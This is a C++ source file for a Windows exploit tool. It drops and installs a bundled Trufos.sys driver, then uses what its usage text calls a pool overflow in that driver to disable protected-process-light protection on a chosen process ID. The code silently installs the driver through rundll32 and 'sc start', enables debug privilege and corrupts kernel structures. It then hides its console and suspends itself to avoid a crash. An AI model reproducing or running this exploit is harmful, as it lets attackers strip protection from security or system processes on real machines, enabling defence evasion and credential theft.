#include <iostream>
#include <windows.h>
#include <string>
#include "Trufos.h"
#include "TrufosDriver.h"
#include "TrufosInf.h"

bool InstallDriver()
{
	if (!EnablePrivilege(SE_LOAD_DRIVER_NAME))
	{
		std::cout << "Failed to enable load driver privilege :(" << std::endl;
		return false;
	}

	HANDLE TrufosDriverFile = CreateFileW(L"Trufos.sys", GENERIC_ALL, 0, 0, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, 0);
	if (TrufosDriverFile == INVALID_HANDLE_VALUE)
	{
		std::cout << "Failed to create Trufos.sys file :(" << std::endl
			<< "Last error: " << std::dec << GetLastError() << std::endl;
		return false;
	}
	DWORD BytesWritten;
	bool Result = WriteFile(TrufosDriverFile, TrufosDriverData, sizeof(TrufosDriverData), &BytesWritten, 0);
	if (!Result)
	{
		std::cout << "Failed to write Trufos.sys file :(" << std::endl
			<< "Last error: " << std::dec << GetLastError() << std::endl;
		CloseHandle(TrufosDriverFile);
		return false;
	}
	CloseHandle(TrufosDriverFile);

	HANDLE TrufosInfFile = CreateFileW(L"trufos.inf", GENERIC_ALL, 0, 0, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, 0);
	if (TrufosInfFile == INVALID_HANDLE_VALUE)
	{
		std::cout << "Failed to create trufos.inf file :(" << std::endl
			<< "Last error: " << std::dec << GetLastError() << std::endl;
		return false;
	}
	BytesWritten;
	Result = WriteFile(TrufosInfFile, TrufosInfData, sizeof(TrufosInfData), &BytesWritten, 0);
	if (!Result)
	{
		std::cout << "Failed to write trufos.inf file :(" << std::endl
			<< "Last error: " << std::dec << GetLastError() << std::endl;
		CloseHandle(TrufosInfFile);
		return false;
	}
	CloseHandle(TrufosInfFile);

	char CurrentDir[MAX_PATH];
	GetCurrentDirectoryA(MAX_PATH, CurrentDir);
	std::string Command("RUNDLL32.EXE SETUPAPI.DLL,InstallHinfSection DefaultInstall 132 ");
	Command += CurrentDir;
	Command += "\\trufos.inf";
	system(Command.c_str());
	system("sc start trufos");

	DeleteFileW(L"Trufos.sys");
	DeleteFileW(L"trufos.inf");
	return true;
}

void PrintUsage()
{
	std::cout << "This is exploit which leverages pool overflow vulnerability in Trufos.sys "
	"in order to disable protected process light protection of particular process" << std::endl;
	std::cout << "Usage: -InstallDriver(optional) -DisableProtection <Pid>" << std::endl;
}

int main(int argc, char** argv)
{
	bool IsInstallDriverEnabled = false;
	DWORD Pid = 0;
	if (argc < 3)
	{
		PrintUsage();
		return 1;
	}
	if (std::string(argv[1]) == "-DisableProtection")
	{
		Pid = std::atoi(argv[2]);
	}
	else if (std::string(argv[1]) == "-InstallDriver")
	{
		if (argc >= 4)
		{
			IsInstallDriverEnabled = true;
			Pid = std::atoi(argv[3]);
		}
		else
		{
			PrintUsage();
			return 1;
		}
	}
	else
	{
		PrintUsage();
		return 1;
	}
	if (Pid == 0)
	{
		std::cout << "Invalid process id :/" << std::endl;
		return 1;
	}

	EnablePrivilege(SE_DEBUG_NAME);

	if (IsInstallDriverEnabled)
	{
		if (!InstallDriver())
		{
			std::cout << "Failed to install trufos driver :(" << std::endl;
			return 1;
		}
	}

	Trufos Exploit;
	if (Exploit.GetIsSetupped() && Exploit.DisableProcessProtection(Pid))
	{
		std::cout << std::endl << "----------------------------" << std::endl;
		std::cout << "Protection disabled :D" << std::endl;
		std::cout << "----------------------------" << std::endl << std::endl;

		std::cout << "Since this exploit has corrupted few structs in kernel, then if this process "
			"was terminated, then bsod would occur. To prevent bsod, this exploit, will free console and "
			"keep running in the background with suspended threads" << std::endl;
		FreeConsole();
	}
	else
	{
		std::cout << "Something went wrong" << std::endl;
		std::cout << "Probably bsod will occur ;(" << std::endl;
	}
	SuspendThread(GetCurrentThread());
}